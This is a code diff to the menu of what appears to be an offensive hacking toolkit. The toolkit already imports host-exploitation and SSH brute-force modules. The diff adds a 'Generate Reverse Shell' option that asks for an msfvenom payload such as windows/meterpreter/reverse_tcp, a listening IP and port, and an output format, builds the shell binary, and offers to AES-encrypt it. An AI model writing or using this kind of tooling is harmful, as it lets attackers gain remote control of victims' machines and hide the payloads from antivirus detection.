@@ -12,8 +12,13 @@ from modules.exploit import identify_vulnerable_hosts, exploit_vulnerable_hosts
 from modules.utils import clear_all_chunks, split_large_csvs, ensure_wordlists, ensure_valid_hosts
 from modules.bruteforce import load_wordlists, bruteforce_ssh
 from modules.config_handler import configure_settings, load_config
+from modules.shell_generator import (
+    generate_msfvenom_shell,
+    encrypt_shell,
+    decrypt_shell,
+    generate_aes_key,
+)
 import os
-
 
 def main_menu():
     global global_hosts, global_live_hosts, global_vulnerable_hosts
@@ -37,7 +42,8 @@ def main_menu():
         print("14.) Split Large CSVs")
         print("15.) SSH Bruteforce")
         print("16.) Configuration Settings")
-        print("17.) Exit")
+        print("17.) Generate Reverse Shell")
+        print("18.) Exit")
 
         choice = input("Enter your choice: ")
 
@@ -89,11 +95,25 @@ def main_menu():
         elif choice == "16":
             configure_settings()
         elif choice == "17":
+            print("\n[ Reverse Shell Generation ]")
+            payload = input("Enter the payload (e.g., windows/meterpreter/reverse_tcp): ").strip()
+            lhost = input("Enter the LHOST (listening IP): ").strip()
+            lport = input("Enter the LPORT (listening port): ").strip()
+            output_format = input("Enter the output format (e.g., exe, elf, raw): ").strip()
+            output_name = input("Enter the output file name: ").strip()
+
+            shell_path = generate_msfvenom_shell(payload, lhost, lport, output_format, output_name)
+            if shell_path:
+                encrypt_choice = input("Do you want to encrypt the shell? (yes/no): ").strip().lower()
+                if encrypt_choice == "yes":
+                    aes_key = generate_aes_key()
+                    encrypt_shell(shell_path, aes_key)
+
+        elif choice == "18":
             print("[INFO] Exiting.")
             break
         else:
             print("[ERROR] Invalid choice. Please select a valid option.")
-
 
 if __name__ == "__main__":
     main_menu()
